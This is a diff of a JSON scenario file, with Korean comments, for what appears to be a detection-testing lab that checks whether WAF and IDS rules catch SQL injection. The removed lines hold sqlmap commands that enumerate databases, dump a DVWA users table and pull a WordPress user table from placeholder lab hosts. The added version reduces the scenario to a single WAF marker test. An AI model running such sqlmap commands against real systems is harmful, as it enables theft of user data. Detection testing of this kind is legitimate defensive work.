@@ -1,51 +1,32 @@
 {
   "scenario_id": "S3",
-  "name": "sqli_data_exfil",
-  "description": "SQL Injection으로 DB 데이터 유출",
-  "category": "exfiltration",
-  "severity": "critical",
-  "mitre_tactics": ["TA0001-Initial Access", "TA0009-Collection", "TA0010-Exfiltration"],
-  "mitre_techniques": ["T1190-Exploit Public-Facing Application", "T1005-Data from Local System", "T1048-Exfiltration Over Alternative Protocol"],
-  "prerequisites": ["S2 계정 탈취 또는 취약 엔드포인트 확인", "DVWA 설치 완료"],
-  "actor": "외부 공격자 (탈취 계정 또는 직접 공격)",
+  "name": "waf_sqli_marker",
+  "description": "고정 SQLi 형태의 조회 문자열에 대한 WAF 탐지/차단 대조",
+  "category": "web_exploitation",
+  "severity": "medium",
+  "implementation": "ea-runner",
+  "aws_execution_status": "not-executed",
+  "prerequisites": [
+    "DetectionOnly 기준선 보존",
+    "동일 요청을 On 모드와 비교할 별도 실행 ID"
+  ],
   "steps": [
-    {
-      "step": 1,
-      "action": "DVWA SQLi (Low → Medium)",
-      "command": "sqlmap -u 'http://APP_IP:8081/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx;security=low' --dbs --batch",
-      "expected": "DB 목록 추출, Suricata SID 9000001"
-    },
-    {
-      "step": 2,
-      "action": "WordPress 플러그인 SQLi",
-      "command": "sqlmap -u 'https://ALB_DNS/?vulnerable_param=1' --tables --batch --level=3",
-      "expected": "WAF SQLi Count, Suricata SID 9000001"
-    },
-    {
-      "step": 3,
-      "action": "데이터 덤프",
-      "command": "sqlmap -u 'http://APP_IP:8081/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='...' -D dvwa -T users --dump --batch",
-      "expected": "사용자 테이블 덤프 성공"
-    },
-    {
-      "step": 4,
-      "action": "대량 SELECT 쿼리 (RDS slow query 트리거)",
-      "command": "sqlmap ... --sql-query='SELECT * FROM wp_users' --batch",
-      "expected": "RDS slow query 로그, 대량 데이터 전송"
-    }
+    "S3 실행기로 단일 SQLi 표시 문자열 전송; --dvwa는 Host=dvwa.lab만 변경",
+    "On에서 403과 미도달 백엔드 로그를 대조. WordPress SQLi 성공/DB 유출을 뜻하지 않음",
+    "DVWA 실제 SQLi는 setup.php 초기화, 저보안 세션, 별도 수동 승인된 실행 기록 필요. DVWA DB 사용자에게 wordpress 접근은 거부되어야 함"
   ],
   "expected_evidence": {
-    "waf": ["AWSManagedRulesSQLiRuleSet 다수 Count/Block"],
-    "suricata": ["SID 9000001 (SQL injection pattern)"],
-    "nginx": ["비정상 쿼리스트링 포함 요청"],
-    "apache": ["500 에러 또는 비정상 응답 크기"],
-    "wordpress_audit": [],
-    "elastic_defend": ["mysql 프로세스 비정상 활동"],
-    "auditd": ["mysql execve 이벤트"],
-    "flow_logs": ["APP→RDS 대량 트래픽"],
-    "cloudtrail": [],
-    "rds": ["slow_query_log: 대량 SELECT", "error_log: 의심 쿼리"]
+    "waf": [
+      "CRS 매칭 원문"
+    ],
+    "nginx": [
+      "request_id와 상태"
+    ],
+    "apache": [
+      "DetectionOnly 통과/On 차단에 따른 도달 여부"
+    ]
   },
-  "detection_rules": ["suricata-9000001", "waf-sqli-block", "elastic-sqli-detected", "rds-unusual-query-volume"],
-  "success_criteria": "SQLi 탐지 → critical alert → 자동 증거 수집 파이프라인 트리거"
+  "actor": "authorized operator / temporary test-a client",
+  "success_criteria": "예상/실제 결과, 원본 위치, 누락, 정책 모드를 각각 기록하고 SIEM 조회와 대조",
+  "command": "python3 /opt/ea/scenario_runner.py --target \"$EA_TARGET\" --ca /opt/ea/alb.pem --scenario S3 --output S3-RUN.json --execute"
 }
